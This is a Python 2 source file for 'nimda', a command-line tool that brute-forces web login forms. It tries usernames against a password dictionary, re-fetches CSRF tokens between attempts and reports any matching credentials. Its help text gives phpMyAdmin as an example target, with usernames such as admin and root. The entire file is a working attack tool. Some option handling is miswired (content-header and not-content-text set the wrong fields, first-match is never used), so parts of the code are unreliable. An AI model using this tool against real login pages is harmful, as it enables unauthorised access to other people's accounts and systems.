from pyquery import PyQuery
import operator
import requests
import time
import sys
import os

def mylogo():
    print """{}
 mm   m mmmmm  m    m mmmm     mm
 #"m  #   #    ##  ## #   "m   ##
 # #m #   #    # ## # #    #  #  #
 #  # #   #    # "" # #    #  #mm#
 #   ## mm#mm  #    # #mmm"  #    #

    {}""".format(bcolors.WARNING, bcolors.ENDC)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'





class Brute:
    """docstring for Brute."""
    def __init__(self):
        self.verbose = False
        self.debugging = False
        self.breakFirstMatch = False
        self.postJson = dict()
        self.incorrectCredentialsResLen = 0
        self.correctCredentials = []
        self.startTime = time.time()
        self.csrfEnabled = False
        self.progresBar = False
        self.responseHtml = False
        self.responseHeader = False
        self.csrfSelector = ''
        self.contentText = ''
        self.notContentText = ''
        self.contentHeader = ''
        self.notContentHeader = ''
        self.setCookie = ''
        self.formName = dict()

    def setUrl(self, url):
        self.url = url
        return self

    def setCsrf(self, csrf):
        self.formName.update({'csrf':csrf})
        self.csrfEnabled = True
        return self

    def setUsernames(self, usernames):
        """
            userlogin=admin,nimda,nick,george
            userlogin is form name for username and
            admin,nimda,nick,george are usernames to try
        """

        self.formName.update({'username':usernames.split('=')[0]})
        self.usernames = usernames.split('=')[1].split(',')
        return self

    def setPasswords(self, passwdTxt):
        """
            usrpasswd=passwd.txt
            usrpasswd is form field name for passwords
            and passwd.txt is dictionary file name provided by user
        """

        self.formName.update({'password':passwdTxt.split('=')[0]})
        self.passwordsTxt = passwdTxt.split('=')[1]
        return self

    def setPostData(self, pData):
        """ ppdata is without usernames and passwords """
        pdt = pData.split('&')
        for x in range(0, len(pdt)):
            currel = pdt[x].split('=')
            self.postJson.update({currel[0]:currel[1]})
        # print self.postJson

    def sendEmptyPostRequest(self):
        tmpJson = self.postJson
        tmpJson.update({self.formName['username']:'00000000'})
        tmpJson.update({self.formName['password']:'00000000'})

        if self.csrfEnabled == True:
            self.postJson.update({self.formName['csrf']:''})

        # self.postJson.update({"ninja":"bliaz"})
        # print tmpJson
        return requests.post(self.url, data = tmpJson)


    def getCsrfToken(self, response, selector):
        # find in response HTML and return it
        pq = PyQuery(response.text)
        # tag = pq('input[name="token"]')
        tag = pq(selector)
        return tag


    def startProccessing(self):
        #incorrect login response length assigned
        firstResp = self.sendEmptyPostRequest()
        # print firstResp.headers['Content-Length']
         

        print "Trying combination of usernames {} with provided passwords from {} file".format(self.usernames, self.passwordsTxt)
        print "Brute-forcing %s" % (self.url)

        progressDash = ''
        csrf_token = self.getCsrfToken(firstResp, self.csrfSelector).val()
        myCounter = 0
        sizeOfDict = sum(1 for line in open(self.passwordsTxt))
        for usrnms in self.usernames:
            with open(self.passwordsTxt) as _dict:
                for passwd in _dict:
                    # session = requests.Session()
                    myCounter+=1
                    # remove previous username adn passwords and csrf
                    if self.csrfEnabled == True:
                        del self.postJson[self.formName['csrf']]

                    del self.postJson[self.formName['username']]
                    del self.postJson[self.formName['password']]

                    #update formdata with new values of username and password
                    if self.csrfEnabled == True:
                        self.postJson.update({self.formName['csrf'] : csrf_token})

                    #update formdata with new values of username and password
                    self.postJson.update({self.formName['username'] : usrnms})

                    # remove \n endlines from txt file
                    self.postJson.update({self.formName['password'] : passwd.rstrip()})

                    if self.debugging == True:
                        print self.postJson




                    # req = requests.post(self.url, data = self.postJson)

                    try:
                        # r = requests.get(url,timeout=3)
                        # r.raise_for_status()
                        # req = requests.post(self.url, data = self.postJson)
                        # session = requests.Session()
                        # print firstResp.cookies['wordpress_test_cookie']
                        # print self.setCookie
                        # print firstResp.cookies
                        req = requests.post(self.url, data = self.postJson, cookies=firstResp.cookies)
                        firstResp = req
                    except requests.exceptions.HTTPError as errh:
                        print ("Http Error:",errh)
                    except requests.exceptions.ConnectionError as errc:
                        print ("Error Connecting:",errc)
                    except requests.exceptions.Timeout as errt:
                        print ("Timeout Error:",errt)
                    except requests.exceptions.RequestException as err:
                        print ("OOps: Something Else",err)



                    if self.csrfEnabled == True:
                        csrf_token = self.getCsrfToken(req, self.csrfSelector).val()


                    if self.verbose != True:
                        os.system('clear')
                        mySpinner = '\ '
                        if myCounter % 4 == 0:
                            mySpinner = '\ '
                        elif myCounter % 4 == 1:
                            mySpinner = '| '
                        elif myCounter % 4 == 2:
                            mySpinner = '/ '
                        else:
                            mySpinner = '- '
                   
                    if self.verbose != True:
                        for cr in self.correctCredentials:
                            print cr
                    
                    if len(progressDash) > 10000:
                        progressDash = ''

                    if self.verbose != True:
                        print "Brute-forcing: {}".format(self.url)
                        print "{} : {}".format(usrnms, passwd.rstrip())
                        print "{} out of {}".format(myCounter, sizeOfDict)
                        if self.progresBar == True:
                            print "{}".format(progressDash)
                        print "{} {} seconds elapsed".format(mySpinner, time.time() - self.startTime)
                    if ((self.contentText != '' and self.contentText in req.text) or (self.notContentText != '' and self.notContentText not in req.text)) or ((self.contentHeader != '' and self.contentHeader in req.text) or (self.notContentHeader != '' and self.notContentHeader not in req.text)):
                        progressDash += bcolors.OKGREEN +'*_*'+bcolors.ENDC
                        print "{}Correct combination! username: {}, password: {}; status-code  : {}{}".format(
                            bcolors.OKGREEN,
                            usrnms,
                            passwd.rstrip(),
                            # headContLen,
                            req.status_code,
                            bcolors.ENDC)
                        self.correctCredentials.append("{}Correct Combination! username: {}, password: {}{}".format(
                            bcolors.OKGREEN,
                            usrnms,
                            passwd.rstrip(),
                            bcolors.ENDC))
                    else:
                        progressDash += bcolors.FAIL +'.'+bcolors.ENDC
                        if self.verbose == True:
                            print "{}WRONG! {} : {}, stat: {}, head-len:{}, content-len: {}, data: {} {}".format(
                            bcolors.FAIL,
                            usrnms,
                            passwd.rstrip(),
                            req.status_code,
                            len(req.headers),
                            len(req.text),
                            self.postJson,
                            bcolors.ENDC)
                    if self.responseHtml == True:
                        print "{}response-HTML:\n {}{}".format(bcolors.BOLD,req.text.encode('utf-8'),bcolors.ENDC)
                    if self.responseHeader == True:
                        print "{}response-header:{}, \n content:\n {}".format(bcolors.BOLD,req.headers,bcolors.ENDC)

                    if myCounter > sizeOfDict:
                        myCounter = 0


        if self.verbose == True:
            mylogo()


        print "Done in {} seconds".format(time.time() - self.startTime)
        for cr in self.correctCredentials:
            print cr
        if len(self.correctCredentials) == 0:
            print '%s Sorry we couldn\'t find any match %s' % (bcolors.FAIL, bcolors.ENDC)

if __name__ == "__main__":
    # --csrf-token-name=csrftok
    # --username=admin,root
    # --password=small.txt
    mylogo()
    execProgram = True
    displayHelp = False
    b = Brute()
    items = sys.argv
    if len(items) <= 1:
        execProgram = False
    for x in range(1,len(items)):
        usrkey = items[x].split('=', 1)

        if usrkey[0] == 'h' or usrkey[0] == 'help' or usrkey[0] == '-h' or usrkey[0] == '--help':
            print """
python nimda.py url='http://localhost/phpmyadmin/index.php' # target link
username='pma_username=admin,root,nimda,ttu' # array for username or just one username
password='pma_password=./small.txt' # passwords dict
csrf-token-name='token' # csrf token input name[name] like <input name="token">
csrf-selector='input[name="token"]' # set query selector to find csrf token in document HTML
post-data='server=1&target=index.php' # all remaining post data except: username,password and csrf-token
verbose # show more output
first-match # return first correct credentials and stop
content-text # contains unique value in authorized page that isnt in login page
not-content-text # not contains unique value in login page that suppose to be
content-header # contains unique value in authorized page header that isnt in unauthorized page header
not-content-header # not contains unique value in login page header that suppose to be

________________________________________________
python nimda.py url='http://localhost/phpmyadmin/index.php' username='pma_username=admin,root,nimda,ttu' password='pma_password=./small.txt' post-data='server=1&target=index.php' csrf-token-name='token' csrf-selector='input[name="token"]' verbose not-content-text='wrong username' content-text='Welcome Dear Customer'

            """
            execProgram = False
            break

        if usrkey[0] == 'csrf-token-name':
            b.setCsrf(usrkey[1])
        if usrkey[0] == 'username':
            b.setUsernames(usrkey[1])
        if usrkey[0] == 'url':
            b.setUrl(usrkey[1])
        if usrkey[0] == 'password':
            b.setPasswords(usrkey[1])
        if usrkey[0] == 'post-data':
            b.setPostData(usrkey[1])
        if usrkey[0] == 'verbose':
            b.verbose = True
        if usrkey[0] == 'debugging':
            b.debugging = True
        if usrkey[0] == 'first-match':
            b.breakFirstMatch = True
        if usrkey[0] == 'csrf-selector':
            b.csrfSelector = usrkey[1]
        if usrkey[0] == 'content-text':
            b.contentText = usrkey[1]
        if usrkey[0] == 'not-content-header':
            b.notContentHeader = usrkey[1]
        if usrkey[0] == 'content-header':
            b.contentText = usrkey[1]
        if usrkey[0] == 'not-content-text':
            b.notContentHeader = usrkey[1]
        if usrkey[0] == 'progress-bar':
            b.progresBar = True
        if usrkey[0] == 'show-response-html':
            b.responseHtml = True
        if usrkey[0] == 'show-response-header':
            b.responseHeader = True
        # if usrkey[0] == 'cookie':
            # b.setCookie = 'wordpress_test_cookie=WP+Cookie+check'


    if execProgram == True:
        # exec
        b.startProccessing()



# python b.py username='username=nimda' url='http://localhost/training_platform/index.php?controller=Users&action=signin' password='password=small.txt' post-data='signin=Sign In' verbose debugging first-match

